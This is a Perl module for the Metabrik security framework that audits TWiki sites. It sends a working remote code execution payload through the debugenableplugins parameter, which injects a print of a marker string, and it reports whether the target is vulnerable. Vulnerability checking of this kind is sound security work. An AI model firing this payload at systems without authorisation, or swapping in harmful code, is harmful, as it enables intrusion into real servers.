#
# $Id$
#
# audit::twiki Brik
#
package Metabrik::Audit::Twiki;
use strict;
use warnings;

use base qw(Metabrik);

sub brik_properties {
   return {
      revision => '$Revision$',
      tags => [ qw(unstable audit twiki) ],
      attributes => {
         url_paths => [ qw($path_list) ],
         target => [ qw(uri) ],
      },
      attributes_default => {
         url_paths => [ '/' ],
         target => 'http://localhost/',
      },
      commands => {
         debugenableplugins_rce => [ ],
      },
      require_modules => {
         'WWW::Mechanize' => [ ],
      },
   };
}

sub debugenableplugins_rce {
   my $self = shift;

   my $target = $self->target;
   my $url_paths = $self->url_paths;
   my $exploit = '?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html'.
      "\r\n\r\n".'Vulnerable TWiki Instance")%3bexit';

   if (ref($url_paths) !~ /ARRAY/) {
      return $self->log->error("debugenableplugins_rce: url_paths must be ARRAYREF");
   }

   $target =~ s/\/*$//;

   for my $url_path (@$url_paths) {
      $url_path =~ s/^\/*//;

      my @users = ();
      my $mech = WWW::Mechanize->new;

      my $url = $target.'/'.$url_path.$exploit;

      $self->log->verbose("url[$url]");

      $mech->get($url);
      if ($mech->status == 200) {
         my $decoded = $mech->response->decoded_content;
         $self->log->verbose($decoded);
         if ($decoded =~ /Vulnerable TWiki Instance/i) {
            $self->log->info("Vulnerable");
         }
         else {
            $self->log->info("Not vulnerable?");
         }
      }
   }

   return 1;
}

1;

__END__

=head1 NAME

Metabrik::Audit::Twiki - audit::twiki Brik

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2014-2015, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of The BSD 3-Clause License.
See LICENSE file in the source distribution archive.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=cut
